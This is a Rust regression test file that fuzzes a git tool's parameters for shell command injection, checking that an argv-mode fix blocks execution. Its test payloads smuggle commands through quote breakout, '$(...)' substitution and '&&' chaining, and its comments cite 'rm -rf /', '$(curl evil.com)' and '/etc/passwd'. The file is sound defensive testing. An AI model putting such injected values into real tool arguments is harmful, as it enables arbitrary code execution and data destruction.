//! Wave SA — GitTool argv-injection fuzz.
//!
//! BLOCKER #1 of the v0.2.0 SECURITY audit: every shell-string-mode
//! parameter (`cwd`, `path`, `paths[]`, `name`, `message`) could be
//! `format!`-injected with shell metacharacters and produce arbitrary
//! code execution. The fix migrates GitTool to argv mode
//! (`shell_command_argv` + `current_dir(cwd)`). These tests verify that
//! shell metacharacters in those parameters are treated as LITERAL
//! characters by git, never interpreted by a shell.
//!
//! Test strategy: each fuzz case targets a known dangerous parameter
//! with a payload that, under shell-string mode, would have triggered
//! filesystem damage (`touch /tmp/wcore-pwn-<unique>`). We then assert
//! the sentinel file does NOT appear after running the op.

use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};

use serde_json::json;
use wcore_tools::Tool;
use wcore_tools::git::GitTool;

/// Generate a unique sentinel path so concurrent test runs / multi-test
/// invocations don't shadow each other. We never want a previous run's
/// `touch` to make THIS run's "file should not exist" assertion fail.
fn sentinel() -> (PathBuf, String) {
    static COUNT: AtomicUsize = AtomicUsize::new(0);
    let n = COUNT.fetch_add(1, Ordering::SeqCst);
    let pid = std::process::id();
    let nano = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let path = std::env::temp_dir().join(format!("wcore-sa-pwn-{pid}-{nano}-{n}.flag"));
    let path_str = path.to_string_lossy().to_string();
    (path, path_str)
}

async fn init_repo(dir: &std::path::Path) {
    let mut cmd = tokio::process::Command::new("git");
    cmd.arg("init").arg("-q").current_dir(dir);
    cmd.output().await.expect("git init");
    let mut cmd = tokio::process::Command::new("git");
    cmd.args(["config", "user.email", "a@b"]).current_dir(dir);
    cmd.output().await.expect("git config email");
    let mut cmd = tokio::process::Command::new("git");
    cmd.args(["config", "user.name", "A B"]).current_dir(dir);
    cmd.output().await.expect("git config name");
}

/// `cwd` injection: `'; touch <sentinel>; '` — under the old shell-mode
/// code this would have closed the `cd '...'` quoting and executed
/// `touch`. With argv mode + `current_dir`, the value is just a path
/// string the OS will reject as non-existent.
#[tokio::test]
async fn cwd_with_shell_metacharacters_does_not_execute_payload() {
    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("'; touch {sentinel_str}; '");

    let tool = GitTool;
    let result = tool
        .execute(json!({ "op": "status", "cwd": payload }))
        .await;

    // The op should fail (non-existent dir), but no sentinel file
    // should have been created — the `;` was not interpreted.
    assert!(result.is_error, "cwd payload should fail to spawn git");
    assert!(
        !sentinel_path.exists(),
        "RCE: sentinel file was created via cwd injection: {sentinel_path:?}"
    );
}

/// `cwd` with `$(...)` command substitution: shell would have run the
/// inner command and substituted its output. Argv mode passes the
/// literal `$(curl evil.com)` to `current_dir`, which the OS treats as
/// a path component.
#[tokio::test]
async fn cwd_with_command_substitution_does_not_evaluate() {
    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("$(touch {sentinel_str})");

    let tool = GitTool;
    let _ = tool
        .execute(json!({ "op": "status", "cwd": payload }))
        .await;

    assert!(
        !sentinel_path.exists(),
        "RCE: command-substitution payload executed via cwd: {sentinel_path:?}"
    );
}

/// `path` injection on `diff`: `../../etc/passwd; rm -rf /` — the `;`
/// would have terminated the diff and run rm. Argv mode passes the
/// whole string as a single pathspec to git.
#[tokio::test]
async fn diff_path_with_shell_metacharacters_does_not_execute() {
    let tmp = tempfile::tempdir().unwrap();
    init_repo(tmp.path()).await;
    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("../../etc/passwd; touch {sentinel_str}");

    let tool = GitTool;
    let _ = tool
        .execute(json!({
            "op": "diff",
            "cwd": tmp.path().to_str().unwrap(),
            "path": payload,
        }))
        .await;

    assert!(
        !sentinel_path.exists(),
        "RCE: diff path injection executed: {sentinel_path:?}"
    );
}

/// `path` injection on `blame` with command substitution.
#[tokio::test]
async fn blame_path_with_command_substitution_does_not_evaluate() {
    let tmp = tempfile::tempdir().unwrap();
    init_repo(tmp.path()).await;
    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("$(touch {sentinel_str})");

    let tool = GitTool;
    let _ = tool
        .execute(json!({
            "op": "blame",
            "cwd": tmp.path().to_str().unwrap(),
            "path": payload,
            "line": 1,
        }))
        .await;

    assert!(
        !sentinel_path.exists(),
        "RCE: blame path substitution executed: {sentinel_path:?}"
    );
}

/// `paths[]` injection on `add_paths`: under shell mode the entries
/// were wrapped in single-quotes but embedded `'` was NOT escaped, so
/// `a'; touch X; '` broke out.
#[tokio::test]
async fn add_paths_with_quote_breakout_does_not_execute() {
    let tmp = tempfile::tempdir().unwrap();
    init_repo(tmp.path()).await;
    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("a'; touch {sentinel_str}; '");

    let tool = GitTool;
    let _ = tool
        .execute(json!({
            "op": "add_paths",
            "cwd": tmp.path().to_str().unwrap(),
            "paths": [payload],
        }))
        .await;

    assert!(
        !sentinel_path.exists(),
        "RCE: add_paths quote-breakout executed: {sentinel_path:?}"
    );
}

/// `name` injection on `branch_checkout`: `foo && /bin/sh -c whoami`
/// would have chained a shell. Argv mode passes the whole thing to
/// `git checkout -- <name>`, which git rejects as an invalid ref.
#[tokio::test]
async fn branch_checkout_name_with_metacharacters_does_not_execute() {
    let tmp = tempfile::tempdir().unwrap();
    init_repo(tmp.path()).await;
    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("foo && touch {sentinel_str}");

    let tool = GitTool;
    let result = tool
        .execute(json!({
            "op": "branch_checkout",
            "cwd": tmp.path().to_str().unwrap(),
            "name": payload,
        }))
        .await;

    // The op should fail (git rejects the bad ref name) but no
    // sentinel should appear.
    assert!(
        result.is_error,
        "branch_checkout with bad ref should fail: {}",
        result.content
    );
    assert!(
        !sentinel_path.exists(),
        "RCE: branch_checkout name injection executed: {sentinel_path:?}"
    );
}

/// `commit.message` injection: `msg"; touch X; #` would have closed
/// the `-m '...'` quote in shell mode. Argv mode passes the whole
/// message verbatim to `git commit -m`.
#[tokio::test]
async fn commit_message_with_quote_breakout_does_not_execute() {
    let tmp = tempfile::tempdir().unwrap();
    init_repo(tmp.path()).await;
    // Stage something so commit has anything to commit.
    let file = tmp.path().join("a.txt");
    std::fs::write(&file, "hi").unwrap();
    let mut cmd = tokio::process::Command::new("git");
    cmd.args(["add", "a.txt"]).current_dir(tmp.path());
    cmd.output().await.unwrap();

    let (sentinel_path, sentinel_str) = sentinel();
    let payload = format!("msg\"; touch {sentinel_str}; #");

    let tool = GitTool;
    let result = tool
        .execute(json!({
            "op": "commit",
            "cwd": tmp.path().to_str().unwrap(),
            "message": &payload,
        }))
        .await;

    // The commit should SUCCEED, with the literal payload as the message.
    assert!(
        !result.is_error,
        "commit should succeed with literal payload as message: {}",
        result.content
    );
    assert!(
        !sentinel_path.exists(),
        "RCE: commit message injection executed: {sentinel_path:?}"
    );

    // Verify the actual commit message in the repo IS the literal payload.
    let mut log_cmd = tokio::process::Command::new("git");
    log_cmd
        .args(["log", "-1", "--pretty=format:%s"])
        .current_dir(tmp.path());
    let out = log_cmd.output().await.unwrap();
    let stored = String::from_utf8_lossy(&out.stdout);
    assert!(
        stored.contains("touch"),
        "expected payload preserved as literal message; got {stored:?}"
    );
}

/// Sanity check: a normal, well-formed call still works after the
/// rewrite.
#[tokio::test]
async fn well_formed_status_still_succeeds() {
    let tmp = tempfile::tempdir().unwrap();
    init_repo(tmp.path()).await;
    let tool = GitTool;
    let result = tool
        .execute(json!({
            "op": "status",
            "cwd": tmp.path().to_str().unwrap(),
        }))
        .await;
    assert!(
        !result.is_error,
        "status on clean repo should succeed: {}",
        result.content
    );
}
